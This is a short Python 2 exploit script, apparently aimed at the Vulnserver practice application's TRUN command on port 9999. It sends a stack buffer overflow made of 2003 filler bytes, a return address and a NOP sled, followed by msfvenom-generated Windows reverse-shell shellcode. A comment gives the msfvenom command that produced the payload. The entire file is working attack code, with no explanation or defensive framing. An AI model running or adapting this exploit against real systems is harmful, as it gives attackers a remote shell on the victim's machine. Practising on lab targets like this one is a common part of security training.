#!/usr/bin/python

import socket


host = "IP"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=2222 EXITFUNC=thread -fEXITFUNC=thread  python -b "\x00"

buf =  b""
buf += b"\xd9\xed\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbb\xd1"
buf += b"\xcc\x6b\x5c\x83\xea\xfc\x31\x5a\x13\x03\x8b\xdf\x89"
buf += b"\xa9\xd7\x08\xcf\x52\x27\xc9\xb0\xdb\xc2\xf8\xf0\xb8"
buf += b"\x87\xab\xc0\xcb\xc5\x47\xaa\x9e\xfd\xdc\xde\x36\xf2"
buf += b"\x55\x54\x61\x3d\x65\xc5\x51\x5c\xe5\x14\x86\xbe\xd4"
buf += b"\xd6\xdb\xbf\x11\x0a\x11\xed\xca\x40\x84\x01\x7e\x1c"
buf += b"\x15\xaa\xcc\xb0\x1d\x4f\x84\xb3\x0c\xde\x9e\xed\x8e"
buf += b"\xe1\x73\x86\x86\xf9\x90\xa3\x51\x72\x62\x5f\x60\x52"
buf += b"\xba\xa0\xcf\x9b\x72\x53\x11\xdc\xb5\x8c\x64\x14\xc6"
buf += b"\x31\x7f\xe3\xb4\xed\x0a\xf7\x1f\x65\xac\xd3\x9e\xaa"
buf += b"\x2b\x90\xad\x07\x3f\xfe\xb1\x96\xec\x75\xcd\x13\x13"
buf += b"\x59\x47\x67\x30\x7d\x03\x33\x59\x24\xe9\x92\x66\x36"
buf += b"\x52\x4a\xc3\x3d\x7f\x9f\x7e\x1c\xe8\x6c\xb3\x9e\xe8"
buf += b"\xfa\xc4\xed\xda\xa5\x7e\x79\x57\x2d\x59\x7e\x98\x04"
buf += b"\x1d\x10\x67\xa7\x5e\x39\xac\xf3\x0e\x51\x05\x7c\xc5"
buf += b"\xa1\xaa\xa9\x4a\xf1\x04\x02\x2b\xa1\xe4\xf2\xc3\xab"
buf += b"\xea\x2d\xf3\xd4\x20\x46\x9e\x2f\xa3\xa9\xf7\x2f\x41"
buf += b"\x42\x0a\x2f\xad\x3c\x83\xc9\xc7\x50\xc2\x42\x70\xc8"
buf += b"\x4f\x18\xe1\x15\x5a\x65\x21\x9d\x69\x9a\xec\x56\x07"
buf += b"\x88\x99\x96\x52\xf2\x0c\xa8\x48\x9a\xd3\x3b\x17\x5a"
buf += b"\x9d\x27\x80\x0d\xca\x96\xd9\xdb\xe6\x81\x73\xf9\xfa"
buf += b"\x54\xbb\xb9\x20\xa5\x42\x40\xa4\x91\x60\x52\x70\x19"
buf += b"\x2d\x06\x2c\x4c\xfb\xf0\x8a\x26\x4d\xaa\x44\x94\x07"
buf += b"\x3a\x10\xd6\x97\x3c\x1d\x33\x6e\xa0\xac\xea\x37\xdf"
buf += b"\x01\x7b\xb0\x98\x7f\x1b\x3f\x73\xc4\x2b\x0a\xd9\x6d"
buf += b"\xa4\xd3\x88\x2f\xa9\xe3\x67\x73\xd4\x67\x8d\x0c\x23"
buf += b"\x77\xe4\x09\x6f\x3f\x15\x60\xe0\xaa\x19\xd7\x01\xff"


buffer = "A" * 2003  + "\xaf\x11\x50\x62" + "\x90" * 28 + buf


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send("TRUN /.:/" + buffer)
s.recv(1024)

print "[+] Buffer sent!"

s.close()
